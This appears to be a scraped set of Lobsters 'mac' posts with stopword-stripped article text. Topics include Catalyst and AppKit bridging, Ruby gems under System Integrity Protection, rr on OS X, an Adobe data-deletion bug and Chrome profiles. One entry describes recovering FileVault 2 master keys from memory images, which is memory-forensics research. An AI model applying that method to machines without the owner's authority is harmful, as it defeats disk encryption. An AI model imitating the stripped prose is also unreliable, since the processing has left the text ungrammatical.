upon world figured pretty good example catalyst respectful mac user experience thus far hcc radio done well limited niche irish radio streaming apps one interesting question last year around applescript support catalyst marzipan apps possible sure idea app would make app review took upon build applescripting hcc radio illustrate macos uh deep cut app built io apis hcc radio fun side project something really motivating actually shipping software compelled try bringing app io unlike catalyst project hcc radio built first mac next obvious choice bring ipad conceptually similar many way ipad would able reuse existing structure app iphone would require rethink navigation wanted build kind ipad app people like want much blownup iphone app really happy turned going bring io expand app new feature needed better product name broadcast born broadcast unlike hcc radio full support adding station collection syncs icloud run io ipados mac retains applescript support whereas io support mouse trackpad pulldown command menu discoverable keyboard shortcut like hcc radio broadcast free app preset irish radio station want unlock editing feature asks simple inapp purchase subscription monthly fee required app universal purchase buy iphone ipad get mac version free vice versa first time ever shipped app inapp purchase pretty curious see land following development thread twitter pleased know broadcast live app store iphone ipad mac free go try hope like ipad ui much check mouse trackpad support let know kind feature like see next interesting rumor wwdc shortcut might coming mac course raise kind question future automation macos wwdc came went shortcut got huuge upgrade io like new conversational editor thirdparty action input output shortcut come mac turn catalyst macos catalina includes shortcut framework including one necessary bring almost entire ui built dummy app find github test harness nt really useful anything except explore idea shortcut mac would fit system would want product make fun demo shortcut consumer product brand unto think many u building library shortcut io would love way bring mac many io apps coming mac via catalyst likely never adopt applescript even though indeed possible catalyst apps could benefit let hope shortcut team find time busy takingovertheworld schedule bring shortcut macos submit feedback make sure know important wwdc new way write apps mac catalyst catalyst developerfacing name technology formerly known marzipan bringing ipad apps mac introducing uikit dozen framework io platform unifying substrate layer io macos catalyst apps built io sdk relatively change api set simply click mac checkbox project xcode get started previously documented far one could go mojave version uikit jumped enough hoop mean integrate applescript service many reason benefit catalystbased mac app deeply integrate system feature catalyst sdk hand go integrating mac appkit build best possible mac app uikit let take available uikit macos catalyst apps granted access nstoolbar part appkit sdk apps create rich window toolbars nstouchbar integrate touch bar wanted spawn appkit window appkit view hierachy augment app try use appkit class catalyst app rapidly run apiunavailablebegin io appkit class marked unavailable uikit app first glance seems pretty clear cut io sdk nt let touch appkit app however new unified process model macos catalina mean uikit app also appkit app could use loading appkit bundle since apple making point treat catalyst apps true mac apps mean app mac app embed appkitbased bundle framework load runtime plugin simply add new macos bundle target project embed new macos bundle app make inclusion conditional macos simple loadable bundle built mac sdk thus access appkit load manually detect running macos nsstring pluginpath nsbundle mainbundle builtinpluginspath stringbyappendingpathcomponent appkitgluebundle nsbundle bundlewithpath pluginpath load create principal class bundle remember add infoplist treat like entrypoint appkit land instantiate uikit code good go using appkit unified process model macos catalina uikit app nsapplication sharedinstance might expect appkit list app window like would nswindow appkit app give bridge modify app window way otherwise catalyst make impossible like changing window style mask setting position frame onscreen setting minimummaximum window size free spawn new window like load appkit nib storyboards whatever suit best everything running app free call selector uikit appkit might best use intermediary class pas message two since wo nt able import uikit appkit code one thing ca nt mix uikit appkit layer view hierarchy may technically possible kind thing would expect break moment another thing quite spawn new nswindow uikit view hierarchy however uikit code ability spawn new window scene appkit code ability take resulting nswindow presented hijack whatever want sense could spawn uikit window auxiliary palette kind feature clearly intended use catalyst push boundary make best software like expect fellow mac developer else using appkit uikit app enable let go martin pilkington fantastic list thing appreciate appkit see catalyst app improve auxiliary panel sheet spawn nspanel instance floating palette control app like tool palette also present complex appkit window sheet uikit window want little adventurous listen new window spawn use hijack uikitspawned window purpose perhaps make nonactivating floating panel present window sheet proxy icon set representedurl representedfilename primary window add proxy icon currently open document add icon window titlebar represent document point user drag drop proxy icon another app somewhere finder also commandclick proxy icon show document full path color picker bridge use nscolorpanel uikit app get rich native color picker use drive uikit ui color picker also load thirdparty color picker plugins many great example exist macos cursor change mouse cursor nscursor might expect system cursor custom image many mac apps change cursor based tool content interacting way catalyst app also give way showhide mouse cursor game capture wish dock update dock icon app runtime custom generated icon like progress bar long export operation add badge string also customize dock menu option runtime menu bar status item implement nsstatusitem appkit bundle provide menu bar icon like may used apps like dropbox status item dropdown menu many apps spawn borderless window simulate miniapp ui invoked status item theoretically might able present uikit app window status item little iphonesized region quite appropriate used full mac ipad app nsworkspace use nsworkspace move item trash reveal file finder load icon file disk among many thing nstask system nstask allows run shell command commandline apps pipe thing process appkit bundle uikit app support interaction applescript applescript service easier ever use follow previous instruction applescript section earlier post add apple event support app one tiny thing changed since mojave implementation longer need private aeinstallrunloopdispatcher call setupappleevents apple event already set might expect appkit good go decide best relay apple event uikit code action appropriate app service service let vend action system various type content like file image text etc service menu show context menu app offer service currently selected type content service show menu simply follow apple legacy tutorial implement service appkit bundle everything work see bridge appkit like make world difference maclike app feel user many way hybrid uikitappkit app give best world compatibility existing io codebase well able much possible give mac user thing expect good mac app apple starting use little bit catalyst mac apps like fullscreen imessage effect macos catalina sure accelerate future even something exciting new swiftui card apple lot thing built uikit thirdparty developer mac deserves able use uikit way need want build thing mac future bright catalyst apps dieter bohn make case apple go allin marzipan want apple force like okay ipad version mail version mail mac user inside apple get use nt like fix think many apps stomach nt everyone gon na use regular mac apps mean ask microsoft keeping window classic version office around trying change apps window window went nt go well vocal think uikit coming mac something excited much potential unifying software ecosystem across apple platform right ca nt stay fence like microsoft work need need make good hard imagine wanting use write kind software io make feel mac make io user feel really hope apple finally deciding marzipan decade io apple dominant platform mean apple longer fence mac v io divide made tough decision chart course future mac desktop apple provides next week wwdc bring uikit apps mac nt good enough need let know fix year step two multiyear transition inevitably leave u running universal iosmac apps arm mac plenty time fix thing nt standard expect mac apps mac platform prepare radar must allhandsondeck moment apple really nt think viable future mac marzipan fall flat face apple dominant ecosystem io ship sailed new ui framework declarative layer top going change arithmetic new app framework mac definition shared across io mac right back started time got point may native desktop apps left io still accelerating future new formfactors augmented reality whatever come next even native app development titan like adobe version photoshop development webassembly hard see appeal developer web amazing webgl webassembly enable kind powerful new platform however truly believe apple provides best native development framework world platform many highest quality consumer apps world steve job would explain next later cocoa framework presentation used building analogy love much developer write apps platform build upon foundation laid beneath next framework powerful like starting twentieth floor building building upwards developer ever going build three floor worth great app starting twentieth floor end twentythreefloor building os reinvent wheel every time new apps start lower floor fifth floor classic mac o started steve analogy three storey app would nt even reach high starting point next app next competitive advantage became apple competitive advantage later iphone competitive advantage competitive advantage native platform apple web would shame halfass transition marzipan concede defeat web apps desktop instead letting native apps reach height deserve still dividing apple attention one two native app framework ten floor tall always major constraint want see apple really transition painful apple yes think worth piece first appeared macstories may way back era io laid tentpole feature wanted see come io mac three year later many thing wishlist become reality probably good time revisit topic nt yet come pas plan new wishlist year come originally planned list developeruser split became clear two go handinhand complex thing io today using various automation apps step away needing thing developer xcode io much changed since development ipad much still stay apple introduced playground year provided swift ide ipad playground fantastic still build install app using mix match c objectivec code swift project structure code take place one file fine teaching material anybody wanting create something complex apple changed app store rule finally enable programming apps live io without fear removed albeit unfortunate restriction like able display output app screen however still way thirdparty programming app run code outofprocess user mistake crash app completely course way build install app locally using one ides pythonista io still incredible need something bridge gap programming environment io let design write build sign install application without resort using mac third party build apple app store rule platform restriction prevent anybody else able thus apple one build xcode io make powerful developer might need whilst also building mechanism o make safe secure possible many fundamental pillar necessary build xcode like nt exist io like useraccessible file system drag drop multiple window floating panel shortly rumor believed terminal environment io much like file system certain class user need commandline environment kind nt gone away sure apple hoped apple shortcut app user ever automating task io make perfect sense provide something power user need especially xcode io becomes reality went built sandboxed terminal app described post populated core bsd utility apple darwin demonstration seen mosh openterm much ish go far emulating linux environment try provide working shell io apps sandboxed using public apis apple capable building real thing nt install emulator ipad able curl url untar run ffmpeg convert local video file sandboxed terminal nt need let mess system apps provide way execute unsigned code kill process able live jail let whatever want inside much way gui user get whatever want shortcut maintaining safety security o systemlevel drawingmarkup view four year postapple pencil still apple provides developer apis drawing sketching markup every app reinvent wheel want pencilbased drawing may suit couple developer invested lot time effort drawing engine excludes every developer happens good idea way integrate sketching app apple provided sample code past sadly openglesbased want anything appropriate left scour github building drawing engine look good feel responsive promotion incredibly difficult yet apple great drawing framework o use note app would perfect provide developer several apps sitting shelf would benefit greatly builtin api drawing view hope apple get around sooner rather later custom view controller nonui extension provider extension powered many new apis io macos completely obviating plugin model robust outofprocess signed sandboxed mechanism however developer define extension point thus use empower apps programming environment io able run code extension separate process securely scoped task supposed crash wo nt bring host app course exactly apple playground app work nt something third party allowed access similarly able define uibased extension point apps implement extension would show inside app ever used audio unit extension point exactly let presenting custom uis various instrument audio processing apps installed region inside app ui audio app using coreaudio many way developer could innovate providing extension point fact much custom url ecosystem io sprang standardized way apps talk use function apple shortcut app workflow born custom url ecosystem apple realized potential great acquired workflow built o extension point could exposed action shortcut app let call transparently part workflow without ui instead dosado apps custom url involve today key upkey event seems crazy still unable track raw keyboard event io way barring using private api app allow hold physical key input like wasd key game modifier key like holding shift resizing something app like photoshop maintain aspect ratio developer know key pressed released shortcut invoked restriction seems pointless today incredibly restrictive affecting everything professional creative apps game ipad need robust hardware keyboard support chained restriction formulated decade ago different world mouse support api much way time robust mouse trackpad support io uikit coming mac framework add bunch interaction like right click hover scroll bar bring ipad user benefit choose workflow demand controlling ui absolute coordinate important function mouse forget mousecapturing relative movement essential game remote desktop emulator uikit thus need let capture mouse cursor need click thing onscreen combine robust keyboard support would able play game like firstperson shooter ipad like mac pc quake anyone android supported mouse nearly decade done anything lessen touch experience need worry io user workflow truly want need mouse ipad always nonstarter support one time barrier go away larger ipads external touch screen support time however computer want desk io drafting table ipad essentially blank canvas truer frontfacing button bigger canvas begets entirely new experience dying see io scale desktopsized workflow several apps onscreen desktop io device applequality large external touch screen would love ipad used mac laptop since ipad completely obviated formfactor grows ever powerful imagine ever going back people like apple need offer even bigger model ipad ipad pro already get custom uis expansive layout threecolumn view uikit mac behoove developer create apps layout scale screen anyway deeply envious surface book course turn something along line running io would suit need incredibly well expanded usb device support io mfi might gone usbc ipad pro developer need public apis write user mode driver anything wish plug ipad want able plug various eyetv tuner eyetv app happily init like mac want game capture work io record footage gaming pc actually able edit render fastest computer house ipad pro want plug raspberry ftdi cable view serial output ipad without buying crazy mfibased serial adapter whatever workflow might need burn cd dvd able plug disc drive using app designed task work way ipads simply today readwrite external drive file app wishlist need say long overdue imagine apple holding much longer like go formatpartition external volume readwrite disk image want read drive need able manage erase partition volume understand multiple file system image file apply disk image pervasive disk image support genuinely one crowning achievement result ton disk image two decade macos use disk image every day create cd floppy image pas file tofrom vmware qemu user file system access becomes core part using ipad need rest choose never use mac apple telling old data lost scripting applescript io one item list apple automation landscape shifted dramatically since apple acquired workflow shortcut perception applescript may long world slowly pushed favor sandboxed secure modern extension mechanism employed shortcut scripting still incredibly important evidenced hundred shortcut workflow used anybody take io seriously work day applescript really want see textual interface shortcut let thing without navigate fiddle ui filled action class advanced user prefers writing script thing need script need way run silently without presenting ui onscreen jumping apps scripting extended ui layer letting developer build richly scriptable apps like today mac applescript easy envision shortcut scripting using javascript swift shortcut already scripting action let run javascript webpage virtual machine hard see apple supporting virtualization io virtual machine require thing like justintime compilation execute arbitrary code memory violates one core foundation io security model burn battery life like task however apple provides webkit io also requires special security exception execute code memory macos provides hypervisorframework lightweight virtualization system let developer build virtual machine easily kind user would love see hypervisor io let company like vmware parallel bring expertise ipad offer approved way run armbased linux window couple year macos perhaps emulation may question perhaps wo nt always case sure developer library vms everything do nextstep older version macos iphone sdks course use vms io today opensource apps like bochs mini vmac sideloaded onto device nt ability jit run entirely using cpu emulation significantly slower burn battery entitlement finally brings entitlement entitlement system io allows apple finegrained control developer access feature wish use icloud app app must signed icloud entitlement similar requirement health home apple pay many part io carplay example need special entitlement nt given freely developer fact apply apple get app idea approved even let test feature app app developer ever found abusing privilege entitlement revoked apple app remotely disabled thus entitlement great way apple entrust developer partner special access feature developer never use misuse mind apple could entrust eg google microsoft mozilla entitlement need use real browser engine io instead webkit real chrome real firefox vmware parallel could entrusted build virtual machine emulator without leaving open attack vector malicious thirdparty apps disk utility could permitted partition disk ides could permitted run background process install apps attach debugger running apps many thing given freely developer would arguably make io much le safe place read powerful desktop computer entitlement mechanism place apple could still keep control want let get hand seeing past intercompany politics io going need method thing eventually especially io app ecosystem supplant mac app ecosystem due course mac without ability build install apps attach debugger would unimaginably crippled come long way fear enabling thirdparty apps iphone bring cell network trying actively build future io today like hand tied behind back io long relied fact mac exists fallback perform task apple nt ready rethink modern platform nt mean problem nt relevant worth solving left u situation io move forward new idea mac stand still needing keep compatibility io ecosystem whilst tiptoeing line keeping thing losing freedom power old system active development enthusiasm new correct path forward simply revert mechanism available desktop baggage come rethink thing fit modern secure world io exponentially better working file app drag drop automation background task splitscreen multitasking ipad stylus hardware keyboard ipad well completely hide complexity user nt need know mechanic system beyond tapping app open swiping home indicator close thing added io nt made o harder use transparent sure user nt even know exist user need become essential tentpoles io experience uikit desktop time revisit io app ca nt longer io apps apps nowwith rapidlyupcoming introduction uikit apps mac reminiscing twitter quite bit apple transition mac o x nextstep mac o found common ground despite two different os architecturally design standpoint couple different vector follow permit converge place one artifact final day next prerelease version nextstep despite appearing openstep operating system succeeded nextstep nextstep build abbreviate herein vastly different ui set apps new colored window chrome background image tabbed shelf bottom screen quite departure grayscale nextstep knew however builtin apps piqued interest redesigned rebuilt variant many apps shipped nextstep none change later made openstep fact nt resurface year later apple acquires next revamps openstep mac look feel project named rhapsody later became mac o x server fun track progression apps period let take look version mail follow way o x mail prerelease nextstep next recently sun finalized openstep confused openstep o crossplatform refactor sweeping revamp old nextstep framework seemed acrosstheboard revamp system apps take advantage openstep apps thanks openstep portability would run solaris window well next o however next actually shipped next version o renamed openstep nextstep nt include instead openstep older ironically preopenstep set apps despite shipping year beta tell immediately looking mail step backward mail openstep seems obvious hindsight fancy upgrade next working put shelf realized company future without acquisition perhaps build intended woo potential buyer like apple sure enough rhapsody includes revamped apps getgo mail rhapsody rhapsody apple first attempt merging world macintosh next architecturally much nextstep first build rhapsody released developer august seven month acquisition closed design goal developer beta relatively simple port openstep powerpc adopt mac hig design language iconography provide finder desktop see progression left openstep rhapsody developer release right mac o x serverrhapsody next ui nt maclike machine designed unix workstation professional academic market almost feel ui design language openstep mac o mouse keyboard os nt mean transitioning straightforward multitasking different menuing different famously next o never desktop menu bar across top screen even something simple like scrollbars control take granted today left nextstep apple teach next appkit maclike meant required lot work many year mac o x server maclikeness mac o x server still controlled preference key appkit fact switch completely revert system back looking like openstep wild experience mac o x server looked acted much like mac o pro look feel mac retained power unix next framework even built upon next feature like menu could tear float onscreen however mac o x server fatal flaw become apparent apple year since next acquisition mac o x server nt run legacy mac apps mac developer board rewriting everything completely objectivec appkit mac o x actually work successor mac o apple customer going gut start solution apple going port legacy mac o toolbox new compatibility library called carbon make linchpin consumer mac o x experience even apple knew wanted consumer rhapsody something special however became clear apple needed rethink strategy completely mac o x became completely different thing mac o x server preceded tentpole change would replace kernel driver model replace display postscript rendering pdfbased quartz deeply integrate carbon make legacy mac apps firstclass citizen adopt brand new ui called aqua lot next pure foundation framework rearchitected atop common foundation carbon classic mac o appearance manager became basis aqua ui appkit menu widgetcontrol rendering replaced mac o foundation course meant carbon apps cocoa appkit apps would look despite vastly different architecture apple needed show developer carbon going real valid way forward temporary stopgap committed using carbon mac o x finder carbon version finder introduced mac o x developer preview aqua revealed acted bit like next single root window file viewer toolbar column view secondary window stage apple nt quite know systemwide toolbars inherited nextstep mac o x developer preview first time saw aqua build came transformational change mac o x ui year three apple transition next technology apple path finding maclike rather trying match classic mac o apple better understanding wanted navigation finder element ui still comically oversized finder evidence transition carbon side revisit mail see appkitcocoa faring o release mail mail saw earlier piece look different indeed still betrays next root iconography preference window clearly look similar carbonbased finder see environment starting come together something new shared design language mac o x shipped consumer refined massively first implementation aqua mail mac o x appkit finder mac o x carbon taken apple four year find new maclike template mac o x followed ever since eighteen year later element mac o x ui still recognizable today much think mac experience today came nextstep mac o appkit toolbars service tooltips multicolumn table view font color picker idea dock application bundle installer package home folder multiple user might even hardpressed find carbon app application folder today apple announced wo nt even run next version macos apple got chance complete doover mac o x modern architecture optimized touchscreen device powerful gpus thermal resource battery constraint doover course iphone o instead appkit come way nextstep refactored rebuilt openstep powered first decade mac o x apple apple decided build something fresh everything learned uikit technology progressed uikit device power become complex powerful macos uikit finally coming back mac serve toptier native application development framework alongside appkit start apple next transition like last time almost unfathomably difficult see two completely different architecture cooperate find common ground like last time start baby step uikit adopting metric style macos appkit adopting interaction io two side growing closer time sharing dna like last time road ahead much longer see perspective building towards come next even nt yet know really interesting question probably wo nt answer year come whether uikit carbon cocoa transition think appropriate answer yes uikit present developer ecosystem bring incredibly important appkit also present provides power mac know sure great genredefining apps uikit appkit mac carbon itunes photoshop microsoft office final cut pro eighteen year carbon finally reaching end date transition apps cocoaappkit complete appkit still eighteen year left ahead think mac fine classic mac o nextstep came end mac think everybody agree unified whole much greater sum part clear future still written mac developer io developer alike get help shape need cowbell older
600,Lobsters,mac,Apple macOS,Stealth kernel extension updates on OS X,https://medium.com/@sabrihaddouche/automatic-updates-of-kernel-extensions-in-os-x-9b75b3e45c97,stealth kernel extension update o x,automatic update kernel extension o x stuff blockblock kernel extension automatically updated machine without even restarting fbi san bernardino case q automatic update even ntpd security update showed trace app store warning came edit http http edit http,automatic update kernel extension o x hi working stuff suddently got blockblock popup saying shove want install kernel extension systemlibraryextensions directory name applekextexcludelistkext basically include blacklist plist kexts known issuesthe reason write article seen trace app store got warning nothing without blockblock could even knew kernel extension automatically updated machine without even restartingno trace app store last update feb kext file modified yesterdaythe blockblock popup happened exactly time gzip compression may explain size differenceso ok maybe good thing update blacklist time fbi san bernardino case fbi could easily ask apple sign silent update ship think pretty dangerous thing o x even io thatq automatic update yes automatic update precisely install system data file security update checked default reason worry even ntpd security update showed trace app store warning came binary time kext said trace update nowhere even consoleappi hope apple ask least warn user thing mac user probably updated extension nowsedit utc thanks rtrouton according http talk ethernet driver fail http bug feature still disturbing said prevent ever happening go setting app store uncheck install system data file security update way o x install kind patch ota silently automatically security update o x warn first install via app store still hope apple push least notification kind silent update made checkbox checkededit utc opened issue osxlockdown repository tool reduce attack surface mac http
601,Lobsters,mac,Apple macOS,Extracting FileVault 2 Keys with Volatility,https://tribalchicken.com.au/security/extracting-filevault-2-keys-with-volatility/,extracting filevault key volatility,volatility plugin recover filevault volume master key memory based certain pattern briefly tested o x plugin github volatility framework update aeskeyfind libfvde http contact update,volatility plugin recover filevault volume master key memory based certain pattern briefly tested o x plugin github volatility framework plugin capable recovering volume master key volume protected apple filevault full volume encryption fve solution update confirm scary vulnerability anything new simply way full volume encryption system work eg microsoft bitlocker nowdefunct truecrypt fork issue performance reason generally necessary keep key memory otherwise end additional overhead constantly retrieve key plugin simply make easier add functionality volatility filevault included o x since version us xtsaes encryption encrypt entire volume opposed first version filevault encrypted user home directory current fve solution filevault keep encryption key memory whilst operating traditional method locating encryption key u mere mortal anyway run aeskeyfind attempt locate aes key schedule may used unlock drive finding key way provides starting point developing volatility plugin providing working key may used hunt key memory image screenshot aeskeyfind found vmk note find potential aes key well omitted brevity case vmk running yarascan key show key available three different location kernel memory one location contains entire scheduled key information started looking reliable method locate key perhaps searching particular symbol kind reference really much luck instead started looking pattern memory location pattern data surrounding key could used locate key memory image comparing memory two separate o x vm show similarity memory image may give u something work apparent similarity repetition vmk offset initial key schedule location turn useful knowledge searching key know far vmk exists location kernel memory second location appears key schedule including key start schedule one location always located schedule location key located different offset boot appears unrelated aslr important since related could find aslr shift value second third location located process memory submap marked readonly second location location key schedule aligned start particular page therefore assume key located within process memory kerneltask key schedule always aligned start page memory submap readonly permission r another copy key may found key apply general logic find key memory image get process map kerneltask iterate startaddress compare value startaddress startaddress value match key plugin simply output vmk address found case screenshot memory image vm system volume encrypted well small encrypted volume testing vmk recovered though identifying key match volume left verify vmk correctly extracted attaching disk linux vm using libfvde opensource implementation filevault unlock volume using key note prework required obtain encryptedrootplistwipekey fully documented libfvde documentation everything though course pro con example pro simple fast testing somewhat reliable downside really sexy method finding vmk tested using o x virtual machine encrypted filevault code available github repository http usual feedback much appreciated especially better method locating vmk feel free contact feedback note yet tested o x aim next day update would seem need eat word newer version o x
603,Lobsters,mac,Apple macOS,The easiest way to get started with RabbitMQ on the Mac,https://github.com/jpadilla/rabbitmqapp,easiest way get started rabbitmq mac,rabbitmqapp easiest way get started rabbitmq mac version number adding rabbitmq binary path installing homebrew cask homebrew cask credit mongodbapp giovanni collazo,rabbitmqapp easiest way get started rabbitmq mac download drag application folder doubleclick version number version number project rabbitmqapp try communicate version included rabbitmq binary bundled release version number also includes build number used indicate current version rabbitmqapp independent bundled rabbitmq version adding rabbitmq binary path need add rabbitmq binary path adding following bashprofile add rabbitmqapp binary path path applicationsrabbitmqappcontentsresourcesvendorrabbitmqsbin path using pathhelper alternative sudo mkdir p etcpathsd echo applicationsrabbitmqappcontentsresourcesvendorrabbitmqsbin sudo tee etcpathsdrabbitmqapp installing homebrew cask also install rabbitmqapp homebrew cask brew cask install rabbitmq credit forked adapted mongodbapp site design giovanni collazo
604,Lobsters,mac,Apple macOS,The easiest way to get started with Redis on the Mac,https://github.com/jpadilla/redisapp,easiest way get started redis mac,redisapp easiest way get started redis mac version number adding redis binary path installing homebrew cask homebrew cask credit mongodbapp giovanni collazo,redisapp easiest way get started redis mac download drag application folder doubleclick version number version number project redisapp try communicate version included redis binary bundled release version number also includes build number used indicate current version redisapp independent bundled redis version adding redis binary path need add redis binary path adding following bashprofile add redisapp binary path path applicationsredisappcontentsresourcesvendorredisbin path using pathhelper alternative sudo mkdir p etcpathsd echo applicationsredisappcontentsresourcesvendorredisbin sudo tee etcpathsdredisapp installing homebrew cask also install redisapp homebrew cask brew cask install redisapp credit forked adapted mongodbapp site design giovanni collazo
605,Lobsters,mac,Apple macOS,How to Brick OS X El Capitan Ruby Gem,https://cmcenroe.me/2016/02/16/el-capitan-gem-brick.html,brick o x el capitan ruby gem,workaround full story plethora thanks github blog post thanks stack overflow super user thread administrator radiant player back recovery mode,punchline gem incapable installing gem provide binary recommend running command mac o x el capitan shipped feature called system integrity protection sip also known rootless mean even root directory written one directory usrbin system binary installed trying touch usrbinfoo even root give permission denied error probably overall good thing obviously though legitimate reason write directory installing new binary ruby gem seems order solve problem apple somehow blessed system gem binary power write usrbin blessing extend gem binary happens try update system gem run sudo gem update system current gem us blessing overwrite usrbingem new version new gem longer blessing happens sudo gem install rouge error executing gem errno eperm operation permitted usrbinrougify workaround yet find real fix seem way getting original gem binary back workaround disable system integrity protection entirely reboot recovery mode holding command r key open terminal utility menu run csrutil disable reboot normally full story perhaps like apple think wanting update system gem unreasonable thing expect work plethora way avoid using system ruby macbook serious ruby development bothered needed jekyll could render site locally story start thanks github recent blog post github announced page would running jekyll great except also dropped support redcarpet markdown renderer pygmentsrb highlighter using set migrating kramdown rouge surprisingly easy except trouble getting site render locally github page point figured incorrect version dependency used narrow error output right since jekyll pretty much ruby using decided would easier uninstall gem reinstall latest version quick google told could done gem uninstall option available gem newer system gem el capitan logical thing updated system gem somehow gem uninstall command worked seem care remove binary upon trying reinstall needed gem however everything stopped working error executing gem errno eperm operation permitted usrbinjekyll really confused using sudo getting permission error tried writing random file usrbin root permission error remembered system integrity protection thanks stack overflow another quick google disable sip way could install jekyll site rendered properly since think sip generally okay thing happy workaround wanted original gem back everything would back normal tried find reinstall system ruby o x super user thread gave bad advice recommended downloading o x installer finding essentialspkg inside dmg inside app claimed package contained ruby installing would reinstall ruby fool trust information waited hour installer download waited probably half hour essentialspkg thing done still old version gem oh well least could still use one moved administrator later night wanted music launched radiant player prompted update update downloaded prompted time administrator password unusual software need elevated privilege install usually happens username field filled need enter password time field blank weird typed username password work tried time tried root think ever set root password unlock looking user group pane system preference sure enough regular user regular user horrified even tried unlocking pane prompted request adminstrator credential tried sudo told sudoer felt like computer turned essentialspkg clearly overwrote something gem back recovery mode love recovery mode really make feel safe give root terminal figured could run passwd root use unlock user group pane make administrator passwd sh passwd command found good thankfully googling revealed recovery mode instead resetpassword command launch gui reason end managed reinstate administrator gem still unholy sip turned thing working think probably good time reinstall o x one last goof remember o x installer downloaded hour deleted soon done essentialspkg
606,Lobsters,mac,Apple macOS,rr on OS X: can it be ported?,https://joneschrisg.wordpress.com/2015/01/29/rr-on-os-x-can-it-be-ported/,rr o x ported,level functionality basic recording deterministic replay basic api notification pending signal precise hw performance counter level functionality fast recording dune project contextswitch counter mailing list appendix happy tradeoff appendix like,rr recordreplay tool developed mozilla research spend much space talking rr directly read give try instead want summarize o feature rr relies full functionality post intended pique interest someone lowlevel o x system programming experience might eventually interested attempting bring rr o x need know detail rr work comment whether necessary interface exist o x generally speaking rr two level functionality first level record application way recording deterministically replayed bareminimum functionality recordreplay tool must second level functionality highperformance recording make rr interesting tool performance really feature topic another post level functionality basic recording deterministic replay work rr tracer process must able observe nondeterministic event may affect execution tracee rr also need mechanism preemptively schedule tracee thread replay scheduling decision interface rr us linux basic ptrace api rr us mundane debugger apis like reading writing register memory continuing execution singlestepping forth obviously o x support thing form notification pending signal ptrace rr record signal see detail presumably o x notify somehow ptrace ptracesyscall continue tracee stop entry next syscall rr us trap mainly record outparam data written kernel syscalls prctl prsettsc prtscsigsegv somewhat obscure interface generate sigsegv exception tracee attempt execute rdtsc instruction rr record returned tsc value nondeterministic exception enables schedsetaffinity mask one requires bit explanation problem cpuid instruction nondeterministic example expose number core thread running nominally rr would want record effect cpuid like rdtsc recent processor allow trapping cpuid like rdtsc however linux expose analogous interface like prctl prsetcpuid prcpuidsigsegv proposed patch rejected ground one would ever use sigh rr implement poor man solution bind tracee thread logical processor hardware thread may nondeterministic side effect cpuid missed worked well enough practice perfeventopen precise hw performance counter rr us counter two way first tracees interrupted asynchronous preemption point signal rr record value particular perf counter retired conditional branch value identifies point execution signal arrived replay signal rr advance execution performance counter reach saved value oversimplifying bit second rr program perf counter interrupt certain timeslice mechanism basis rr preemptive scheduling nice coincidence linux perfcounter interrupt surfaced userspace regular signal mean rr recording task preemption signal problem like though personality addrnorandomize addrcompatlayout rr like addressspace randomization disables though aslr could supported effort think o x system hacker bring basic level rr functionality o x level functionality fast recording inherent performance ceiling trap every tracee syscall tracer process project besides rr hit ceiling including chrome linux sandbox team dune project rr run perfectly fine within ceiling linux apis let rr break ceiling ldpreload libso rr injects code tracee process traceeside processing syscalls much possible ldpreload helper code injected o x support prctl prsetseccomp seccompmodefilter prog rr set thing tracee syscalls selectively traced tracee syscalls processed rr preload library without taking ptrace trap rr tracer rr us recent kernel interface known seccompbpf install filter ptracetraps syscalls rr process entirely tracee side detail important necessary essentially kernel interface support efficient sandboxing perfeventopen contextswitch counter really short explanation requirement quickly get rr weed required way interrupt tracees next time contextswitched kernel thread scheduler fairly straightforward linux contextswtiches another sw perf counter programmed interrupt way preemptivescheduler interrupt described o x provide analogous mechanism know please drop u line somehow mailing list probably best really adventurous hack prototype would major effort merge o x port upstream rr would interesting discussion start appendix binary instrumentation yes o footprint recordreplay tool based binary instrumentation much smaller tool built around binary instrumentation chose different approach rr mainly performance reason happy tradeoff far instrumentation fine thing use rr two different approach appendix kernel module sure could write kernel module expose interface rr need major downside approach increased friction new user ii much higher maintenance burden iii unpleasant security implication rather go avoid like like loading related
607,Lobsters,mac,Apple macOS,Warning: Bug in Adobe Creative Cloud deletes Mac user data without warning,http://arstechnica.com/apple/2016/02/warning-bug-in-adobe-creative-cloud-deletes-mac-user-data-without-warning/,warning bug adobe creative cloud deletes mac user data without warning,according official backblaze,backblaze adobe system stopped distributing recently issued update creative cloud graphic service amid report mac version delete important user data without warning permission deletion happen whenever mac user log adobe service update installed according official backblaze data backup service whose user disproportionately inconvenienced bug upon sign script activated creative cloud deletes content alphabetically first folder mac root directory backblaze user especially hit bug backup service relies data stored hidden root folder called bzvol folder alphabetically topmost hidden folder root many user drive affected user many software package caused lot customer freak backblaze marketing manager yev pusin wrote email reason saw huge uptick customer backblaze bzvol higher alphabet tested creating hidden file name file inside removed well backblaze official published three video show deletion bug action including one videoadobe creative cloud deleting backblaze file friday morning adobe creative cloud user flooded twitter complaint unauthorized data deletion many user nt use backblaze reporter ar story included find first folder mac root drive folder store data required mac autosave version history function work properly deleting content could negative consequence adobe bug could also dire consequence user important folder space since also assume top alphabetically sorted spot mac hard drive default labeled macintosh hd adobe spokeswoman issued statement read aware customer experienced issue investigating order resolve matter quickly possible stopping distribution update issue resolved version appears causing deletion pusin said creative cloud user yet installed update hold adobe release detailed guidance people already installed update nt log time one workaround people installed update want log right away create folder assumes alphabetically topmost spot root folder hidden folder name aaaaa come mind backblaze guidance perhaps offering comic relief aggrieved user suggested creating folder called adobedontdeletemybzvol user open terminal paste cd followed sudo mkdir adobedontdeletemybzvol minus quote
608,Lobsters,mac,Apple macOS,Chrome profiles and incognito mode for web developers,http://thepugautomatic.com//2016/02/chrome/,chrome profile incognito mode web developer,chrome profile incognito mode web developer chrome support multiple user profile incognito mode separate home work user profile google instruction keyboard shortcut p b arsoom incognito mode end,chrome profile incognito mode web developerswritten february tagged chromegoogle chrome support multiple user profile incognito mode two feature nt specifically intended make web developer life easier howseparate home work user profilesi use notebook computer home work one home user profile one work profile chromei thing set switch one keyboard shortcuteach profile separate history cookiessessions bookmark bar extension really quite handy logged separate google apps account adblocker extension browsing privately professionally put trello board various work tool work bookmark barand course clearly grouping home work tab separately win minimize work window go home dayto add profile see google instructionskeyboard shortcutsto switch profile leftclick profile name top right chrome switch person click profile want convenientor rightclick profile name click profile want slightly better want mouse around chrome list profile people menu menu bar alongside file edit bookmark etc easy map shortcut least o xin keyboard system preference go app shortcut add shortcut google chrome menu title exactly match name profile shortcut whatever likei use home privat private profile work barsoom incognito modeyou open incognito mode chrome window via file new incognito window shortcutincognito window nt share cookiessessions window logged everything great web developmentif find thinking wonder look like logged nt log open incognito window window logged regular window still conveniently logged inif want log multiple account thing log user regular window open incognito window log user b put two window side side try bidding chat whatever two 